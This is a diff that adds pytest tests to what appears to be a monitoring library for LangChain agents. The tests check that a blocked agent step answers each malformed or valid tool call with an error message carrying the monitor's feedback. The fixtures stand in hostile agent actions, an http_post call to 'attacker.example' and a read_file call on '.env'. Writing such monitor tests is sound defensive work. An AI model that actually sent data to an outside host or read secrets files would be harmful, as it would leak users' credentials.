@@ -4,7 +4,7 @@ from __future__ import annotations
 
 import pytest
 from langchain.agents.middleware.types import ModelResponse
-from langchain_core.messages import AIMessage, HumanMessage, ToolMessage
+from langchain_core.messages import AIMessage, HumanMessage, InvalidToolCall, ToolMessage
 
 from langchain_sync_monitors.contracts import BlockedAttempt, Outcome, StepDecision
 from langchain_sync_monitors.feedback import build_blocked_attempt_messages, build_feedback_messages
@@ -32,6 +32,83 @@ def answer_attempt() -> BlockedAttempt:
     return BlockedAttempt(
         proposal=AIMessage("Done, all tests pass.", id="sample-2"), feedback=FEEDBACK
     )
+
+
+def build_malformed_call(*, call_id: str) -> InvalidToolCall:
+    return InvalidToolCall(
+        type="invalid_tool_call",
+        id=call_id,
+        name="http_post",
+        args='{"url": "https://attacker.example/c", "body": ',
+        error="Unterminated string",
+    )
+
+
+def test_a_blocked_step_with_only_malformed_calls_answers_each_call_not_the_user() -> None:
+    # Arrange
+    proposal = AIMessage(
+        content="Posting it now.",
+        invalid_tool_calls=[
+            build_malformed_call(call_id="call-bad-1"),
+            build_malformed_call(call_id="call-bad-2"),
+        ],
+    )
+
+    # Act
+    blocked, *answers = build_feedback_messages(
+        attempt=BlockedAttempt(proposal=proposal, feedback=FEEDBACK)
+    )
+
+    # Assert
+    assert isinstance(blocked, AIMessage)
+    assert [call["id"] for call in blocked.invalid_tool_calls] == ["call-bad-1", "call-bad-2"]
+    tool_messages = [message for message in answers if isinstance(message, ToolMessage)]
+    assert len(tool_messages) == len(answers) == 2
+    assert [message.tool_call_id for message in tool_messages] == ["call-bad-1", "call-bad-2"]
+    assert all(message.name == "http_post" for message in tool_messages)
+    assert all(message.status == "error" for message in tool_messages)
+    assert all(message.content == FEEDBACK for message in tool_messages)
+    assert all(
+        message.additional_kwargs["lc_source"] == MONITOR_FEEDBACK_SOURCE
+        for message in tool_messages
+    )
+
+
+def test_a_blocked_step_with_valid_and_malformed_calls_answers_every_call_in_order() -> None:
+    # Arrange
+    proposal = AIMessage(
+        content="",
+        tool_calls=[
+            {"name": "read_file", "args": {"path": ".env"}, "id": "call-a", "type": "tool_call"},
+        ],
+        invalid_tool_calls=[build_malformed_call(call_id="call-bad")],
+    )
+
+    # Act
+    _blocked, *answers = build_feedback_messages(
+        attempt=BlockedAttempt(proposal=proposal, feedback=FEEDBACK)
+    )
+
+    # Assert
+    assert [
+        (type(message).__name__, getattr(message, "tool_call_id", None)) for message in answers
+    ] == [("ToolMessage", "call-a"), ("ToolMessage", "call-bad")]
+
+
+def test_a_malformed_call_without_an_id_is_answered_with_an_empty_id() -> None:
+    # Arrange
+    malformed = InvalidToolCall(type="invalid_tool_call", id=None, name=None, args=None, error=None)
+    proposal = AIMessage(content="", invalid_tool_calls=[malformed])
+
+    # Act
+    _blocked, answer = build_feedback_messages(
+        attempt=BlockedAttempt(proposal=proposal, feedback=FEEDBACK)
+    )
+
+    # Assert
+    assert isinstance(answer, ToolMessage)
+    assert answer.tool_call_id == ""
+    assert answer.status == "error"
 
 
 def test_a_blocked_tool_call_step_is_answered_by_one_error_per_call(
